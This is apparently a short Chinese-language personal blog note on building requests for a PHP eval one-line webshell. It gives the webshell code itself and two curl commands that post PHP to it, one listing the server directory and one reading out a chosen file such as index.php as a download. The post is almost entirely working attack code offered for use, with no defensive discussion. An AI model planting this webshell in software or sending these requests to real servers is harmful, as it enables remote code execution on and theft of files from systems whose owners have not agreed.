---
layout: post
title: "php eval webshell"
date: 2020-05-23 14:30
categories: web-security
---

记一下php eval 一句话 webshell 的请求构造

```
<?php @eval($_POST['shell']);?>
```

#### 获取当前目录以及目录下的文件/子目录
```
curl 127.1:80 -d 'shell=$con = dirname(__FILE__); echo $con; $filename = scandir($con); $conname = array();foreach($filename as $k=>$v){if($v=="." || $v==".."){continue;}$conname[] = $v;} var_dump($conname);'
```

#### 下载指定文件($filePath指定要下载的文件名)

```
curl 127.1:8822 -d 'shell=$con = dirname(__FILE__); echo $con; $filename = scandir($con); $conname = array();foreach($filename as $k=>$v){if($v=="." || $v==".."){continue;}$conname[] = $v;} $readBuffer = 1024;$filePath="index.php";header("Content-Type: application/octet-stream");header("Accept-Ranges:bytes");$fileSize = filesize($filePath);header("Content-Length:" . $fileSize); header("Content-Disposition:attachment;filename=" . basename($filePath));$handle = fopen($filePath, "rb");while (!feof($handle) ) {echo fread($handle, $readBuffer);}fclose($handle);'
```
